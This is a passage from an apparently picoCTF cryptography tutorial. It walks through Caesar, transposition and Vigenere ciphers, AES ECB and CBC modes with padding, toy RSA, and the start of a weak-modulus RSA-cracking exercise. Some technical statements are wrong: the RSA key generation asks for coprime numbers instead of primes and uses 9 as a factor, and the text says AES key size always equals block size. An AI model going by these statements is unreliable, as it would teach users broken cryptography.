<span class="tok-nb">print</span><span class="tok-p">(</span><span class="tok-sa">f</span><span class="tok-s2">&quot;Encrypted: </span><span class="tok-si">{</span><span class="tok-n">cipher_text</span><span class="tok-si">}</span><span class="tok-s2">&quot;</span><span class="tok-p">)</span>
<span class="tok-nb">print</span><span class="tok-p">(</span><span class="tok-sa">f</span><span class="tok-s2">&quot;Decrypted: </span><span class="tok-si">{</span><span class="tok-n">caesar_decrypt</span><span class="tok-p">(</span><span class="tok-n">cipher_text</span><span class="tok-p">)</span><span class="tok-si">}</span><span class="tok-s2">&quot;</span><span class="tok-p">)</span></code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>Copy and paste the code into the file, save the file by pressing control+x, press enter, and
                            then execute it with:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="txt"><span></span>python3 caesar.py</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>You should see the following output:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="txt"><span></span>Plain Text: picoctf
s
sl
slf
slfr
slfrf
slfrfw
slfrfwi
Encrypted: slfrfwi
p
pi
pic
pico
picoc
picoct
picoctf
Decrypted: picoctf</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>Read the comments in the python source code to understand it. You probably noted the '%',
                            which is called the modulo operator. That allows us to wrap around a number, because it
                            calculates the remainder of the division. We will see more detail of this in the future, so
                            do not worry too much about it for now. But, know that if we want a number to start from 0
                            again if it surpasses certain threshold, we can use modulo operator. In this case, we use it
                            because we only have 26 letters in the english alphabet. So, the first position is 0, which
                            contains 'a', because arrays start at zero. The last position is 25, which contains 'z'. So,
                            if we want to encrypt 'z', we would need to add 3 positions, and 25+3 is 28, but after 25 we
                            need to begin from 0 again because of the way that caesar works. Modulo operator works
                            perfect for that because:</p>
                    </div>
                    <div class="paragraph">
                        <p>26%26 is 0</p>
                    </div>
                    <div class="paragraph">
                        <p>27%26 is 1</p>
                    </div>
                    <div class="paragraph">
                        <p>28%26 is 2</p>
                    </div>
                    <div class="paragraph">
                        <p>So, as we said before in an example, the letter 'z' would be encrypted with 'c', which is in
                            the position 2 considering that arrays start at 0. Other thing that you maybe did not
                            understand at once from the code, was that we subtracted 97 from the ASCII value. Go to:</p>
                    </div>
                    <div class="paragraph">
                        <p><a href="http://www.asciitable.com/" class="bare">http://www.asciitable.com/</a></p>
                    </div>
                    <div class="paragraph">
                        <p>Note that the letter 'a', is in the position 97, so we simply subtract 97 to apply the
                            overlap trick with modulo 26. Note that this trick would also work by not subtracting 97,
                            but instead applying the modulo on 123, like in the following code:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="python"><span></span><span class="tok-k">def</span> <span class="tok-nf">caesar_encrypt</span><span class="tok-p">(</span><span class="tok-n">text</span><span class="tok-p">):</span>
    <span class="tok-n">result</span> <span class="tok-o">=</span> <span class="tok-s2">&quot;&quot;</span>

    <span class="tok-c1"># Go through each character of the text in this for loop</span>
    <span class="tok-k">for</span> <span class="tok-n">i</span> <span class="tok-ow">in</span> <span class="tok-nb">range</span><span class="tok-p">(</span><span class="tok-nb">len</span><span class="tok-p">(</span><span class="tok-n">text</span><span class="tok-p">)):</span>

        <span class="tok-c1"># Obtain the ASCII value using ord</span>
        <span class="tok-n">char_position</span> <span class="tok-o">=</span> <span class="tok-nb">ord</span><span class="tok-p">(</span><span class="tok-n">text</span><span class="tok-p">[</span><span class="tok-n">i</span><span class="tok-p">])</span>

        <span class="tok-c1"># Add 3 to the position, as caesar does</span>
        <span class="tok-n">new_char_position</span> <span class="tok-o">=</span> <span class="tok-n">char_position</span> <span class="tok-o">+</span> <span class="tok-mi">3</span>

        <span class="tok-n">new_char_position</span> <span class="tok-o">=</span> <span class="tok-n">new_char_position</span> <span class="tok-o">%</span> <span class="tok-mi">123</span>

        <span class="tok-c1"># Convert ASCII value to character and concatenate it to final result</span>
        <span class="tok-n">result</span> <span class="tok-o">=</span> <span class="tok-n">result</span> <span class="tok-o">+</span> <span class="tok-nb">chr</span><span class="tok-p">(</span><span class="tok-n">new_char_position</span><span class="tok-p">)</span>

        <span class="tok-nb">print</span><span class="tok-p">(</span><span class="tok-n">result</span><span class="tok-p">)</span>
    <span class="tok-k">return</span> <span class="tok-n">result</span>

<span class="tok-k">def</span> <span class="tok-nf">caesar_decrypt</span><span class="tok-p">(</span><span class="tok-n">cipher_text</span><span class="tok-p">):</span>
    <span class="tok-n">result</span> <span class="tok-o">=</span> <span class="tok-s2">&quot;&quot;</span>

    <span class="tok-c1"># Go through each character of the text in this for loop</span>
    <span class="tok-k">for</span> <span class="tok-n">i</span> <span class="tok-ow">in</span> <span class="tok-nb">range</span><span class="tok-p">(</span><span class="tok-nb">len</span><span class="tok-p">(</span><span class="tok-n">cipher_text</span><span class="tok-p">)):</span>

        <span class="tok-c1"># Obtain the ASCII value using ord</span>
        <span class="tok-n">char_position</span> <span class="tok-o">=</span> <span class="tok-nb">ord</span><span class="tok-p">(</span><span class="tok-n">cipher_text</span><span class="tok-p">[</span><span class="tok-n">i</span><span class="tok-p">])</span>

        <span class="tok-c1"># Substract 3 to the position, to get back original position</span>
        <span class="tok-n">new_char_position</span> <span class="tok-o">=</span> <span class="tok-n">char_position</span> <span class="tok-o">-</span> <span class="tok-mi">3</span>

        <span class="tok-n">new_char_position</span> <span class="tok-o">=</span> <span class="tok-n">new_char_position</span> <span class="tok-o">%</span> <span class="tok-mi">123</span>

        <span class="tok-c1"># Convert ASCII value to character and concatenate it to final result</span>
        <span class="tok-n">result</span> <span class="tok-o">=</span> <span class="tok-n">result</span> <span class="tok-o">+</span> <span class="tok-nb">chr</span><span class="tok-p">(</span><span class="tok-n">new_char_position</span><span class="tok-p">)</span>

        <span class="tok-nb">print</span><span class="tok-p">(</span><span class="tok-n">result</span><span class="tok-p">)</span>
    <span class="tok-k">return</span> <span class="tok-n">result</span>

<span class="tok-n">text</span> <span class="tok-o">=</span> <span class="tok-s2">&quot;picoctf&quot;</span>
<span class="tok-nb">print</span><span class="tok-p">(</span><span class="tok-sa">f</span><span class="tok-s2">&quot;Plain Text: </span><span class="tok-si">{</span><span class="tok-n">text</span><span class="tok-si">}</span><span class="tok-s2">&quot;</span><span class="tok-p">)</span>
<span class="tok-n">cipher_text</span> <span class="tok-o">=</span> <span class="tok-n">caesar_encrypt</span><span class="tok-p">(</span><span class="tok-n">text</span><span class="tok-p">)</span>
<span class="tok-nb">print</span><span class="tok-p">(</span><span class="tok-sa">f</span><span class="tok-s2">&quot;Encrypted: </span><span class="tok-si">{</span><span class="tok-n">cipher_text</span><span class="tok-si">}</span><span class="tok-s2">&quot;</span><span class="tok-p">)</span>
<span class="tok-nb">print</span><span class="tok-p">(</span><span class="tok-sa">f</span><span class="tok-s2">&quot;Decrypted: </span><span class="tok-si">{</span><span class="tok-n">caesar_decrypt</span><span class="tok-p">(</span><span class="tok-n">cipher_text</span><span class="tok-p">)</span><span class="tok-si">}</span><span class="tok-s2">&quot;</span><span class="tok-p">)</span></code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>Can you explain why?</p>
                    </div>
                    <div class="paragraph">
                        <p>Challenge: Modify the python script to be able to encrypt and decrypt upper case words.</p>
                    </div>
                </div>
                <div class="sect2">
                    <h3 id="_transposition_ciphers">6.3. Transposition ciphers</h3>
                    <div class="paragraph">
                        <p>In transposition ciphers, we don&#8217;t replace the letters by other symbols, but we simply
                            change the order in which they appear on the cleartext. For example, we can decide that our
                            encryption algorithm simply moves the letters to the right and overlaps. Let&#8217;s encrypt
                            the word 'pico' by rotating its letters by one position to the right.</p>
                    </div>
                    <div class="paragraph">
                        <p>clear text &#8594; p i c o</p>
                    </div>
                    <div class="paragraph">
                        <p>encrypted text &#8594; o p i c</p>
                    </div>
                    <div class="paragraph">
                        <p>This is a very simple kind of transposition. But you can have a map that makes more
                            complicated transpositions. For instance, you can decide that you will encrypt a text by
                            doing transpositions in chunks of 6 letters using the following mapping:</p>
                    </div>
                    <div class="imageblock text-center">
                        <div class="content">
                            <img src="images/5image1.png" alt="image" width="198" height="222">
                        </div>
                        <div class="title">Figure 25. Example of mapping of transposition cipher</div>
                    </div>
                    <div class="paragraph">
                        <p>The number indicate the position of the letters. Using that mapping, let&#8217;s encrypt the
                            word 'pico'. Since pico only has 4 letters, we can simply use a padding to complete until 6
                            letters. For this example, we will use the symbol * as padding, so we have:</p>
                    </div>
                    <div class="imageblock text-center">
                        <div class="content">
                            <img src="images/5image2.png" alt="image" width="198" height="222">
                        </div>
                        <div class="title">Figure 26. Applying mapping with padding</div>
                    </div>
                    <div class="paragraph">
                        <p>The encrypted word is 'c*ip*o' using our arbitrarily defined mapping. Suppose we want to
                            encrypt a long text. In that case we simply apply the same mapping each 6 characters.</p>
                    </div>
                    <div class="paragraph">
                        <p>So far, we saw how transposition and substitution ciphers work. If they are used only by
                            themselves, they are very easy to crack. On the other hand, if someone finds out the
                            algorithm we use to encrypt, the encryption is broken forever! A way to improve this, is by
                            using encryption algorithms based on a key.</p>
                    </div>
                </div>
                <div class="sect2">
                    <h3 id="_key_ciphers">6.4. Key ciphers</h3>
                    <div class="paragraph">
                        <p>There is a principle in cryptography called the Kerckhoffs&#8217;s principle that states: "A
                            cryptosystem should be secure even if everything about the system, except the key, is public
                            knowledge". That principle professes to overcome the fact that once the encryption algorithm
                            is known by the enemy the encryption is broken. The solution is to use a key. One old
                            algorithm that was used to encrypt data using a key was "Vigenere". It looks certainly
                            stronger than the previous algorithms we learned. Even though it is easily breakable
                            nowadays, in its time it was considered unbreakable.</p>
                    </div>
                    <div class="paragraph">
                        <p>To understand how Vigenere works we will encrypt the cleartext:</p>
                    </div>
                    <div class="paragraph">
                        <p>"I LOVE PITTSBURGH"</p>
                    </div>
                    <div class="paragraph">
                        <p>First, we remove the spaces, because the Vigenere table does not have the space. However, a
                            human can easily recognize the words of a text even if it has no spaces. We get:</p>
                    </div>
                    <div class="paragraph">
                        <p>"ILOVEPITTSBURGH"</p>
                    </div>
                    <div class="paragraph">
                        <p>Now, we can pick a key. For this example, we will use the key "PICOCTF". Since our text is
                            larger than the key, we simply repeat the key several times until we get the same length in
                            the following manner:</p>
                    </div>
                    <div class="paragraph">
                        <p>Plaintext: ILOVEPITTSBURGH</p>
                    </div>
                    <div class="paragraph">
                        <p>Key: PICOCTFPICOCTFP</p>
                    </div>
                    <div class="paragraph">
                        <p>The first letter of the cleartext is paired with the first letter of the key. So, we have the
                            pair ('I','P') Now in the vigenere table that is presented below, we use row i and column p.
                            The cell at the intersection of the column and the row will be the encrypted letter, which
                            in this case is X. We do the same for the rest of the letters, and we would obtain the
                            following:</p>
                    </div>
                    <div class="paragraph">
                        <p>Cleartext: ILOVEPITTSBURGH</p>
                    </div>
                    <div class="paragraph">
                        <p>Key: PICOCTFPICOCTFP</p>
                    </div>
                    <div class="paragraph">
                        <p>Encrypted text: XTQJGINIBUPWKLW</p>
                    </div>
                    <div class="imageblock text-center text-center">
                        <div class="content">
                            <img src="images/5image45.png" alt="5image45" width="427" height="301">
                        </div>
                        <div class="title">Figure 27. Vigenere table</div>
                    </div>
                    <div class="paragraph">
                        <p>Now let&#8217;s see how decryption works. Suppose we only have the key and the encrypted:</p>
                    </div>
                    <div class="paragraph">
                        <p>Key: PICOCTFPICOCTFP</p>
                    </div>
                    <div class="paragraph">
                        <p>Encrypted text: XTQJGINIBUPWKLW</p>
                    </div>
                    <div class="paragraph">
                        <p>We take the first letter of the key, which is 'P', and go to that row in the vigenere table.
                            Then in the row 'P', we find the first letter of the encrypted text, which is 'X'.The column
                            that corresponds to 'X', is the first letter of the clear text, which in our case is 'I'.
                            You repeat the same process for each character until you get 'ILOVEPITSBURGH'.</p>
                    </div>
                    <div class="paragraph">
                        <p>To verify that you understand the decryption, decrypt the encrypted text "WMNZQAJ" using the
                            key "HELLO", remember that if the key is shorter, you just repeat it. You should obtain a
                            word you will easily recognize!</p>
                    </div>
                    <div class="paragraph">
                        <p>Vigenere is easily broken even without a computer. Simon Singh, a famous science
                            communicator, has a nice tool on his website for cracking Vigenere:</p>
                    </div>
                    <div class="paragraph">
                        <p><a href="https://www.simonsingh.net/The_Black_Chamber/vigenere_cracking_tool.html"><span
                                    class="underline">https://www.simonsingh.net/The_Black_Chamber/vigenere_cracking_tool.html</span></a>
                        </p>
                    </div>
                    <div class="paragraph">
                        <p>Cracking ciphers is a field itself called cryptanalysis. Cryptanalysis and Cryptography
                            compose bigger field called Cryptology.</p>
                    </div>
                </div>
                <div class="sect2">
                    <h3 id="_modern_cryptography">6.5. Modern cryptography</h3>
                    <div class="paragraph">
                        <p>In modern cryptography exist the concept of symmetric and asymmetric cryptography. Symmetric
                            cryptography means that you use the same key for encryption and decryption like we just did
                            on Vigenere. In asymmetric cryptography you have two keys. One is for encryption, known as
                            the public key, the other one is for decryption, known as the private key. Asymmetric
                            cryptography is useful because it can be used to solve the problem of a key exchange.
                            Additionally, it can be applied for digital signatures that provide integrity and
                            non-repudiation.</p>
                    </div>
                    <div class="sect3">
                        <h4 id="_symmetric_crypto_example_aes">6.5.1. Symmetric crypto example: AES</h4>
                        <div class="paragraph">
                            <p>A commonly used algorithm today for symmetric cryptography, is AES, which means "Advanced
                                Encryption Standard". This algorithm has a combination of substitutions and
                                transpositions using a key of fixed length. A key of fixed length means that the
                                algorithm can only have a key with a certain size. However, AES has different versions
                                and each version can support a key length of different sizes. The most common versions
                                are AES 128 and AES 256, which have a key length of 128 bits and AES 256 respectively.
                                AES algorithm is considered secure. However, the implementation can be attacked
                                successfully if it has flaws. For example, one famous way to break AES encryption is the
                                Padding Oracle Attack, which allows to successfully crack SSL, an encrypted protocol
                                that was widely used to secure HTTP traffic. However, this is not a weakness of AES, but
                                a weakness in how it is used.</p>
                        </div>
                        <div class="paragraph">
                            <p>AES has different operation modes. We will analyze two of them to illustrate
                                vulnerabilities that can emerge in their use. These operation modes are "ECB" and "CBC".
                            </p>
                        </div>
                        <div class="sect4">
                            <h5 id="_operation_mode_ecb">Operation mode ECB</h5>
                            <div class="paragraph">
                                <p>ECB means Electronic Code Book. In this operation mode we encrypt independently
                                    blocks of the clear text according to the key length. For example, if we are using
                                    AES 128, we break the clear text in chunks of 128 bits and use AES to encrypt them
                                    independently. This causes a problem because it leaks structure in the encrypted
                                    text. There is a famous example on the internet about an image of Tux (the penguin
                                    from linux) encrypted using AES in ECB operation mode:</p>
                            </div>
                            <div class="paragraph">
                                <p>Original image:</p>
                            </div>
                            <div class="imageblock text-center">
                                <div class="content">
                                    <img src="images/5image46.png" alt="image" width="196" height="216">
                                </div>
                                <div class="title">Figure 28. Tux, the Linux penguin</div>
                            </div>
                            <div class="paragraph">
                                <p>Encrypted image using AES on ECB mode:</p>
                            </div>
                            <div class="imageblock text-center">
                                <div class="content">
                                    <img src="images/5image47.png" alt="image" width="196" height="216">
                                </div>
                                <div class="title">Figure 29. Encrypted penguin using ECB, we still see it, which is bad
                                </div>
                            </div>
                            <div class="paragraph">
                                <p>Yow can see that is easy to identify that the encrypted image contains the penguin.
                                    In other cases, this operation mode can be very bad for other reasons. Suppose you
                                    are sending an encrypted text and you know that the first 128 bits contain a name
                                    and the second 128 bits contain a date. Imagine that you are an attacker that
                                    captures some encrypted messages on different dates. Even if you do not know the
                                    key, you could be able to interchange the second block of messages to tamper the
                                    date. To understand this better let&#8217;s look at an example. Suppose you
                                    intercept a message sent on May 1, and after some days you intercept another message
                                    in on May 8.</p>
                            </div>
                            <div class="paragraph">
                                <p>Imagine you want to make the receiver think that the second message is from May 1.
                                    You could simply replace the blue block by the red block.</p>
                            </div>
                            <div class="imageblock text-center">
                                <div class="content">
                                    <img src="images/5image3.png" alt="5image3">
                                </div>
                                <div class="title">Figure 30. Blocks of message</div>
                            </div>
                            <div class="paragraph">
                                <p>Another problem of ECB is that if you send the same message twice, any attacker can
                                    see that the same message is being sent again. A secure encryption algorithm should
                                    not leak any information about the message. Knowing that the same message was sent
                                    in the past can be used to learn details about the communication. It is recommended
                                    to never use ECB.</p>
                            </div>
                        </div>
                        <div class="sect4">
                            <h5 id="_operation_mode_cbc">Operation mode CBC</h5>
                            <div class="paragraph">
                                <p>A more secure operation mode is CBC, which means Cipher Block Chaining. In this mode
                                    we include additional elements. The first one is the initialization vector, a random
                                    value with the same size as the key. In AES, the key size is the same as the block
                                    size. Remember that in AES we must separate the cleartext in blocks with the same
                                    size as the key. Before starting the encryption, we do XOR between the first block
                                    of cleartext and the Initialization Vector, then we begin to encrypt using AES with
                                    the key of our choice. The initialization vector is different for every message, so
                                    if we send the same message twice, it will be different due to the initialization
                                    vector. We must attach the initialization vector to the message. Another element we
                                    add in this operation mode, is that we do not encrypt blocks independently, but we
                                    use the encrypted text from one block and XOR it with the next block of cleartext we
                                    want to encrypt. Then, we use AES and the key to encrypt that result. In the
                                    following image it is shown the graphical representation of what it was just
                                    explained, note that the circle with the cross means XOR:</p>
                            </div>
                            <div class="imageblock text-center">
                                <div class="content">
                                    <img src="images/5image48.png" alt="image" width="624" height="250">
                                </div>
                                <div class="title">Figure 31. CBC diagram</div>
                            </div>
                            <div class="paragraph">
                                <p>In AES, the cleartext must be the same size as a multiple of the block size. For
                                    example, if you have a cleartext that happens to be shorter than a block, you need
                                    to add padding to the cleartext so it matches at least one block. In a case where
                                    cleartext is larger than one block, but smaller than two, you need to add padding to
                                    the cleartext until it is the same size as two blocks. In AES there is a common way
                                    of padding, which is a standard called PKCS #7. In AES 128, as we said previously,
                                    the block size is 128 bits, which is equivalent to 16 bytes. Suppose you want to
                                    encrypt the message</p>
                            </div>
                            <div class="paragraph">
                                <p>"HELLOPICOCTF"</p>
                            </div>
                            <div class="paragraph">
                                <p>Since that message is 12 bytes, we require to add a padding of 4 bytes to complete
                                    the size of a block. In PKCS#7 you add padding using a byte with the value of bytes
                                    you need to pad. In our example, since we need to pad 4 bytes to complete 16 bytes,
                                    we would pad like this:</p>
                            </div>
                            <div class="paragraph">
                                <p>"HELLOPICOCTF"+"\x04\x04\x04\x04"</p>
                            </div>
                            <div class="paragraph">
                                <p>Note that "\x" is a way to tell that in a string we want to use that exact number on
                                    a byte, even if it is not printable ASCII. Now, suppose we want to encrypt a message
                                    of 15 bytes like:</p>
                            </div>
                            <div class="paragraph">
                                <p>"GOODBYEPICOCTF!"</p>
                            </div>
                            <div class="paragraph">
                                <p>After we pad it using PKCS#7, the result is:</p>
                            </div>
                            <div class="paragraph">
                                <p>"GOODBYEPICOCTF!"+"\x01"</p>
                            </div>
                            <div class="paragraph">
                                <p>What would be the result after padding the message "BYEPICOCTF"?</p>
                            </div>
                            <div class="paragraph">
                                <p></p>
                            </div>
                            <div class="paragraph">
                                <p>If you answered:</p>
                            </div>
                            <div class="paragraph">
                                <p>"BYEPICOCTF"+"\x06\x06\x06\x06\x06\x06"</p>
                            </div>
                            <div class="paragraph">
                                <p>You are correct.</p>
                            </div>
                        </div>
                    </div>
                    <div class="sect3">
                        <h4 id="_asymmetric_crypto_example_rsa">6.5.2. Asymmetric crypto example: RSA</h4>
                        <div class="paragraph">
                            <p>Remember that asymmetric crypto, means that we use one key for encrypting (the public
                                key) and another key for decrypting (the private key). Suppose you want to communicate
                                secretly with asymmetric crypto. In that case, you generate a public and private key
                                pair. Then, give the public key to anyone that wants to send you an encrypted message.
                                They will encrypt the message using your public key and when you receive the encrypted
                                message, you are the only one that can decrypt it, because you are the only one that has
                                the private key. That&#8217;s why it is called "private". Note that your public key can
                                be of public knowledge and no one would be able to decrypt the message. If you want to
                                send an encrypted message to someone, that person would have to give you their public
                                key.</p>
                        </div>
                        <div class="paragraph">
                            <p>A very widely used algorithm for asymmetric cryptography is RSA. It is called RSA because
                                of its inventors: Ronald <strong>R</strong>ivest, Adi <strong>S</strong>hamir, and
                                Leonard <strong>A</strong>dleman. To understand how it works, we will encrypt and
                                decrypt using RSA algorithm with a public-private key pair that was generated for this
                                example; it will seem a bit magical. After that, we will understand some concepts, learn
                                to generate keys, and encrypt and decrypt with the generated keys.</p>
                        </div>
                        <div class="paragraph">
                            <p>Before encrypting, you need to understand how it works the modulo operation if you do not
                                know already. It is actually very simple. The modulo operation finds the remainder after
                                division of one number by another. For example, 8 mod 3 = 2, because 3 fits in 8 two
                                times, and we have a reminder of 2. Since RSA uses very basic arithmetic, we are ready
                                to see the example. In RSA, the public key is a pair of numbers, as well as the private
                                key. The message can be anything that we can represent as a number. In a computer,
                                everything is a number as we know. The encrypted text, also called ciphertext, will be
                                another number. In summary, this what we need in RSA to encrypt and decrypt:</p>
                        </div>
                        <div class="paragraph">
                            <p>RSA public key: Is a pair of numbers (e,n)</p>
                        </div>
                        <div class="paragraph">
                            <p>RSA private key: Is a pair of numbers (d,n)</p>
                        </div>
                        <div class="paragraph">
                            <p>Message: m</p>
                        </div>
                        <div class="paragraph">
                            <p>Ciphertext: c</p>
                        </div>
                        <div class="paragraph">
                            <p>To encrypt: m<sup>e</sup> mod n = c</p>
                        </div>
                        <div class="paragraph">
                            <p>To decrypt: c<sup>d</sup> mod n = m</p>
                        </div>
                        <div class="paragraph">
                            <p>Basically, 'd' is the private value of the private key, since 'n' is also in the public
                                key. As you just saw, the formulas are very simple. To encrypt a message, you simply
                                take the message to the power of 'e', and then do modulo 'n'. To decrypt, take the
                                ciphertext to the power of 'd', and then do modulo 'n', and that would result in the
                                original message. In this example the numbers of the keys are very small, which is
                                insecure in real life. RSA is only secure when large values are used. By 2019, RSA is
                                considered secure only if the key is a number that would take at least 2048 bits. Which
                                is roughly <strong>617 digits</strong>. This is how it looks as a 617 digit number:</p>
                        </div>
                        <div class="listingblock">
                            <div class="content">
                                <pre
                                    class="pygments highlight"><code data-lang="text"><span></span>639792933441952154134189948544473456738316249934191318148092777710386387734317720754565453220777092120190516609628049092636019759882816133231666365286193266863360627356763035447762803504507772355471058595487027908143562401451718062464362679456127531813407833033625423278394497538243720583531147711992606381334677687969597030983391307710987040859133746414428227726346594704745878477872019277152807317679077071572134447306057007334924369311383504931631284042512192565179806941135280131470130478164378851852909285452011658393419656213491434159562586586557055269049652098580338507224264829397285847831630577775606888764</code></pre>
                            </div>
                        </div>
                        <div class="paragraph">
                            <p>This is certainly a very big number. However, to understand how it works it is a good
                                idea to use small numbers. Let&#8217;s look at an example:</p>
                        </div>
                        <div class="paragraph">
                            <p>Public key (e,n) &#8594; (11,117)</p>
                        </div>
                        <div class="paragraph">
                            <p>Private key (d,n) &#8594; (35,117)</p>
                        </div>
                        <div class="paragraph">
                            <p>Message m &gt; 10</p>
                        </div>
                        <div class="paragraph">
                            <p>So far, we have a private key which has an e=11, and a public key with a d=35. Our
                                message is 10. To encrypt 10, we do:</p>
                        </div>
                        <div class="paragraph">
                            <p>10<sup>11</sup> mod 117</p>
                        </div>
                        <div class="paragraph">
                            <p>The result of that is 82. So, we have:</p>
                        </div>
                        <div class="paragraph">
                            <p>10<sup>11</sup> mod 117 = 82</p>
                        </div>
                        <div class="paragraph">
                            <p>Ciphertext &#8594; 82</p>
                        </div>
                        <div class="paragraph">
                            <p>Now, for decrypting, we do:</p>
                        </div>
                        <div class="paragraph">
                            <p>82<sup>35</sup> mod 117 = 10</p>
                        </div>
                        <div class="paragraph">
                            <p>Cleartext &#8594; 10</p>
                        </div>
                        <div class="paragraph">
                            <p>That was a bit magical. The RSA private and public key are generated with steps that make
                                them have this property. The process of key generation is relatively simple. We only
                                need to understand some parts of it to show our attack. Note that "In number theory, two
                                integers a and b are said to be relatively prime, mutually prime, or coprime (also
                                written co-prime) if the only positive integer (factor) that divides both of them is 1.
                                Consequently, any prime number that divides one does not divide the other. This is
                                equivalent to their greatest common divisor (gcd) being 1"<sup class="footnote">[<a
                                        id="_footnoteref_1" class="footnote" href="#_footnotedef_1"
                                        title="View footnote.">1</a>]</sup>. The multiplicative inverse is a number that
                                we use to multiply another number, and obtain 1 as a result. For example, in non-integer
                                arithmetic (in RSA we only use integer arithmetic) the multiplicative inverse of 8, is
                                1/8, Because 8 * 1/8=1. However, in integer arithmetic we don&#8217;t have fractions.
                                But we can have a multiplicative inverse modulo n, which means that if we have a number,
                                multiply it by its multiplicative inverse, and take modulo n, the result will be 1.</p>
                        </div>
                        <div class="paragraph">
                            <p>For example, the multiplicative inverse in 3 modulo 4, is 3, Why? Because if you multiply
                                3*3, that results in 9, and 9 modulo 4, is 1. Now you are ready to see the key
                                generation without getting lost. This is it:</p>
                        </div>
                        <div class="ulist">
                            <ul>
                                <li>
                                    <p>Generate two large co-prime numbers, p and q.</p>
                                </li>
                                <li>
                                    <p>Find n = pq and phi = (p-1) (q-1)</p>
                                </li>
                                <li>
                                    <p>Select e such that 1 &lt; e &lt; phi, and e is coprime of phi</p>
                                </li>
                                <li>
                                    <p>Find d, which is the multiplicative inverse of e modulo phi.</p>
                                </li>
                                <li>
                                    <p>The couple (e, n) is the public key</p>
                                </li>
                                <li>
                                    <p>The couple (d, n) is the private key</p>
                                </li>
                            </ul>
                        </div>
                        <div class="paragraph">
                            <p>It is relatively simple! To find a multiplicative inverse, you can use the Extended
                                Euclidean Algorithm (EEA). In google it is easy to find an online implementation of it.
                                Remember our example in which we had these key pair?</p>
                        </div>
                        <div class="paragraph">
                            <p>Public key (e,n) &#8594; (11,117)</p>
                        </div>
                        <div class="paragraph">
                            <p>Private key (d,n) &#8594; (35,117)</p>
                        </div>
                        <div class="paragraph">
                            <p>That was generated in the same manner. First, we picked two coprime numbers. The numbers
                                of our choice were:</p>
                        </div>
                        <div class="paragraph">
                            <p>p=13</p>
                        </div>
                        <div class="paragraph">
                            <p>q=9</p>
                        </div>
                        <div class="paragraph">
                            <p>They are coprime, because their greatest common divisor is 1. Then</p>
                        </div>
                        <div class="paragraph">
                            <p>n=13*9=117</p>
                        </div>
                        <div class="paragraph">
                            <p>phi=(13-1)(9-1)=96</p>
                        </div>
                        <div class="paragraph">
                            <p>To pick e, we arbitrarily pick a number that is greater than 1 and less than phi, and it
                                is coprime with phi. The number 11 complies with those requirements. So</p>
                        </div>
                        <div class="paragraph">
                            <p>e=11</p>
                        </div>
                        <div class="paragraph">
                            <p>Now, to obtain 'd' applying the EEA. We can do that on this web site:</p>
                        </div>
                        <div class="paragraph">
                            <p><a href="https://planetcalc.com/3298/" class="bare">https://planetcalc.com/3298/</a></p>
                        </div>
                        <div class="paragraph">
                            <p>We input 11 and 96 in the following manner:</p>
                        </div>
                        <div class="imageblock text-center">
                            <div class="content">
                                <img src="images/5image49.png" alt="5image49">
                            </div>
                            <div class="title">Figure 32. Euclidean Extended Algorithm online interface</div>
                        </div>
                        <div class="paragraph">
                            <p>And the result we want is 35. Now we have:</p>
                        </div>
                        <div class="paragraph">
                            <p>d=35</p>
                        </div>
                        <div class="paragraph">
                            <p>With those results, we know the private and public keys are:</p>
                        </div>
                        <div class="paragraph">
                            <p>Public key (e,n) &#8594; (11,117)</p>
                        </div>
                        <div class="paragraph">
                            <p>Private key (d,n) &#8594; (35,117)</p>
                        </div>
                        <div class="paragraph">
                            <p><strong>Exercise</strong>: Create your own public and private key, and use it to encrypt
                                and decrypt a two digit number!</p>
                        </div>
                        <div class="sect4">
                            <h5 id="_attacking_rsa">Attacking RSA</h5>
                            <div class="paragraph">
                                <p>RSA can be easily broken if it has a small 'n'. This does not happen often in real
                                    life, unless a programmer decides to implement their own version of RSA. A
                                    programmer should not make their own implementations of cryptography, it is a
                                    general rule to use libraries tested by industry. The security of RSA is based on
                                    the fact that there is not an efficient algorithm to factorize a large 'n', so an
                                    attacker is not able to generate the private key from the public key. In case 'n' is
                                    too small, it is possible to factorize it.</p>
                            </div>
                            <div class="paragraph">
                                <p>We are going to see how to break RSA by recovering the private key from the public.
                                    In real life, the public key comes in a digital certificate, which is a package that
                                    contains data related to the owner of the public key along with the public key
                                    itself. Digital certificates are often encoded in base64, which is a way of encoding
                                    a binary as a printable text. The following is an example of a digital certificate
                                    encoded in base64:</p>
                            </div>
                            <div class="listingblock">
                                <div class="content">
                                    <pre class="pygments highlight"><code data-lang="text"><span></span>-----BEGIN CERTIFICATE-----
MIIB6zCB1AICMDkwDQYJKoZIhvcNAQECBQAwEjEQMA4GA1UEAxMHUGljb0NURjAe
Fw0xOTA3MDgwNzIxMThaFw0xOTA2MjYxNzM0MzhaMGcxEDAOBgNVBAsTB1BpY29D
VEYxEDAOBgNVBAoTB1BpY29DVEYxEDAOBgNVBAcTB1BpY29DVEYxEDAOBgNVBAgT
B1BpY29DVEYxCzAJBgNVBAYTAlVTMRAwDgYDVQQDEwdQaWNvQ1RGMCIwDQYJKoZI
hvcNAQEBBQADEQAwDgIHEaTUUhKxfwIDAQABMA0GCSqGSIb3DQEBAgUAA4IBAQAH
al1hMsGeBb3rd/Oq+7uDguueopOvDC864hrpdGubgtjv/hrIsph7FtxM2B4rkkyA
eIV708y31HIplCLruxFdspqvfGvLsCynkYfsY70i6I/dOA6l4Qq/NdmkPDx7edqO
T/zK4jhnRafebqJucXFH8Ak+G6ASNRWhKfFZJTWj5CoyTMIutLU9lDiTXng3rDU1
BhXg04ei1jvAf0UrtpeOA6jUyeCLaKDFRbrOm35xI79r28yO8ng1UAzTRclvkORt
b8LMxw7e+vdIntBGqf7T25PLn/MycGPPvNXyIsTzvvY/MXXJHnAqpI5DlqwzbRHz
q16/S1WLvzg4PsElmv1f
-----END CERTIFICATE-----</code></pre>
                                </div>
                            </div>
                            <div class="paragraph">
                                <p>Copy that text into a text file on the webshell, and name it "weak_n_certificate".
                                    The first thing we must do to crack RSA with a weak n, is to extract the n from the
                                    certificate. Remember that n is the modulus and e is the exponent.
                                    You can use the following command to extract those values:</p>
                            </div>
